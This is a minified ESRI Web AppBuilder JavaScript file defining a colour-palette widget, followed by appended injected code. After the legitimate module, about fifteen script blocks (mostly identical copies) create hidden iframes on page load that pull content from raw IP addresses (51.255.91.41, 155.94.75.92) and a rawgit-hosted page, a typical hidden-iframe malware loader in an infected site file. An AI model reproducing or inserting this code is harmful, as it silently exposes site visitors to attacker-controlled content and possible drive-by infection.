// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/on dojo/_base/Color dojo/query jimu/dijit/ColorChooser jimu/dijit/CustomColorPicker jimu/dijit/ColorRecords dijit/popup jimu/utils dijit/a11yclick".split(" "),function(f,g,h,k,l,d,c,e,b,m,n,p,q,r,t,u){return g([h,l,k,f],{templateString:"\x3cdiv\x3e\x3c/div\x3e",baseClass:"jimu-color-palette",declaredClass:"jimu.dijit.ColorPalette",_TRANSPARENT_STR:"rgba(0, 0, 0, 0)",
value:"",_defaultAppearance:{showTransparent:!0,showColorPalette:!0,showCoustom:!0,showColorPickerOK:!1,showColorPickerApply:!0,showCoustomRecord:!0,closeDialogWhenChange:!1},recordUID:"",postMixInProperties:function(){this.nls=window.jimuNls.colorPalette},postCreate:function(){this.inherited(arguments);this.value=this.value?new b(this.value):new b("#fff");this._createContent()},initUI:function(){this._toggleCustomColorPicker("init",!1)},_createContent:function(){this.appearance=d.mixin(this._defaultAppearance,
this.appearance);var a=c.create("div",{"class":"jimu-colorpalette"},this.domNode);this.initPanel=c.create("div",{"class":"init-panel"},a);this.customPanel=c.create("div",{"class":"custom-panel hide"},a);this.appearance.showTransparent&&this._createSpecialColors(this.initPanel);this.appearance.showColorPalette&&this._createColorChooser(this.initPanel);this.appearance.showCoustom&&this._createCustomColorPicker(this.initPanel);this.appearance.showCoustom&&this.appearance.showCoustomRecord&&this._createCoustomRecord(this.initPanel)},
setColor:function(a){this._isColorEqual(a)||(this.value=new b(a),this._setSpatialColor(this.value),"undefined"!==typeof this.value.a&&0===this.value.a?(this.colorChooser.setColor(new b("transparent"),!1),this.picker.setColor(new b("#fff"),!1)):(this.colorChooser.setColor(this.value.toHex(),!1),this.picker.setColor(this.value,!1)),this.colorRecords&&this.colorRecords.selecteColor(this.value))},getColor:function(){return this.value},changeColor:function(a){if("undefined"!==typeof this.value.a&&0===
this.value.a)this.onChange(this.value);else this.onChange(this.value.toHex());this.emit("change",this.value);!0===this.appearance.closeDialogWhenChange&&!1!==a&&this._closeDialog()},refreshRecords:function(){this.colorRecords&&this.colorRecords.refresh()},destroy:function(){r.close(this.tooltipDialog);this.picker.destroy();this.inherited(arguments)},_createSpecialColors:function(a){a=c.create("div",{"class":"special-color"},a);this.transparentBtn=c.create("div",{"class":"transparent btn",innerHTML:'\x3cdiv class\x3d"btn-wapper"\x3e\x3cdiv class\x3d"transparent icon jimu-float-leading"\x3e\x3c/div\x3e\x3cdiv class\x3d"transparent text jimu-float-leading"\x3e'+
this.nls.transparent+"\x3c/div\x3e\x3c/div\x3e"},a);this.own(e(this.transparentBtn,u,d.hitch(this,this._onTransparentClick)))},_onTransparentClick:function(){this.setColor(new b("transparent"));this.changeColor()},_setSpatialColor:function(a){if(this.transparentBtn){var b=m(".btn-wapper",this.transparentBtn)[0];c.removeClass(b,"selected");a&&a.toString&&a.toString()===this._TRANSPARENT_STR&&c.addClass(b,"selected")}},_createColorChooser:function(a){this.colorChooser=new n({});this.colorChooser.placeAt(a);
this.own(e(this.colorChooser,"change",d.hitch(this,function(a){a=new b(a);this.setColor(a);this.changeColor()})))},_createCustomColorPicker:function(){this.coustomtBtn=c.create("div",{"class":"coustom btn",innerHTML:'\x3cdiv class\x3d"btn-wapper"\x3e\x3cdiv class\x3d"custom icon jimu-float-leading"\x3e\x3c/div\x3e\x3cdiv class\x3d"custom text jimu-float-leading"\x3e'+this.nls.custom+"\x3c/div\x3e\x3c/div\x3e"},this.initPanel);this.own(e(this.coustomtBtn,"click",d.hitch(this,function(){this._toggleCustomColorPicker("custom")})));
this.picker=new p({showOk:this.appearance.showColorPickerOK,showApply:this.appearance.showColorPickerApply,value:this.value.toHex()});this.picker.placeAt(this.customPanel);this.picker.setColor(this.value);this.own(e(this.picker,"ok",d.hitch(this,function(a){this.setColor(new b(a));this.changeColor();this._addAColorRecord(a);this._toggleCustomColorPicker("init");this._closeDialog()})));this.own(e(this.picker,"apply",d.hitch(this,function(a){this.setColor(new b(a));this.changeColor(!1);this._addAColorRecord(a)})));
this.own(e(this.picker,"cancel",d.hitch(this,function(){this._toggleCustomColorPicker("init");this._closeDialog()})))},_toggleCustomColorPicker:function(a,b){"custom"===a?(c.removeClass(this.customPanel,"hide"),c.addClass(this.initPanel,"hide")):(c.addClass(this.customPanel,"hide"),c.removeClass(this.initPanel,"hide"));"undefined"!==typeof b&&!1===b||this.emit("change-style")},_createCoustomRecord:function(a){this.colorRecords=new q({recordsLength:10,uid:this.recordUID||""});this.colorRecords.placeAt(a);
this.own(e(this.colorRecords,"choose",d.hitch(this,function(a){this.setColor(new b(a));this.changeColor()})))},_addAColorRecord:function(a){this.colorRecords&&this.colorRecords.push&&this.colorRecords.push(a)},_isColorEqual:function(a){return this.value.toString()===(new b(a)).toString()?!0:!1},_changeLabel:function(a){c.empty(this.domNode);c.create("span",{innerHTML:a.toHex(),className:"color-label",style:{color:t.invertColor(a.toHex())}},this.domNode)},onOpen:function(){this.openDialog()},openDialog:function(){this.initUI()},
_closeDialog:function(){this.emit("close")},onClose:function(){this._closeDialog()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});